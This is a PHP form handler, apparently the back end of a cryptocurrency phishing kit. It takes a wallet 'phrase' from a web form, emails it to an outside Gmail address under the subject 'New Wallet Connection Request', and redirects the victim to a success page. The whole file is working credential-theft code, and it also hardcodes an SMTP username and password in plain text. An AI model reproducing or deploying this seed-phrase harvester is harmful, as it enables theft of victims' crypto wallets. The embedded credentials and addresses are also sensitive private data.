<?php
// Include the Composer autoloader
require 'vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Check if form is submitted
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['submit'])) {
    // Retrieve the form data
    $phrase = trim($_POST['phrase']);

    // Validate the form input (basic validation)
    if (empty($phrase)) {
        die('Error: Please enter a valid detail.');
    }

    // Create a new PHPMailer instance
    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();                                            // Set mailer to use SMTP
        $mail->Host       = 'lim114.truehost.cloud';                // Specify main and backup SMTP servers
        $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
        $mail->Username   = 'contact@formfix.tech';                 // SMTP username
        $mail->Password   = 'FormFix@014';                          // SMTP password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            // Enable SSL encryption
        $mail->Port       = 465;                                    // TCP port to connect to

        // Recipients
        $mail->setFrom('contact@formfix.tech', 'FormFix Contact');  // Set the sender's email
        $mail->addAddress('me.bdigitals@gmail.com', 'Bright Digitals');   // Add the recipient's email
        $mail->addReplyTo('contact@formfix.tech', 'FormFix Contact'); // Reply-to address

        // Content
        $mail->isHTML(true);                                  // Set email format to HTML
        $mail->Subject = 'New Wallet Connection Request';
        $mail->Body    = 'Phrase: ' . htmlspecialchars($phrase); // HTML content
        $mail->AltBody = 'Phrase: ' . htmlspecialchars($phrase); // Plain text content

        $mail->send();
        echo 'Message has been sent';
        // Redirect to a success page (optional)
        header('Location: success.html');
        exit;
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
} else {
    // If form is not submitted, redirect back to form page
    header('Location: Connect.php'); // Change to your actual form page
    exit;
}
?>
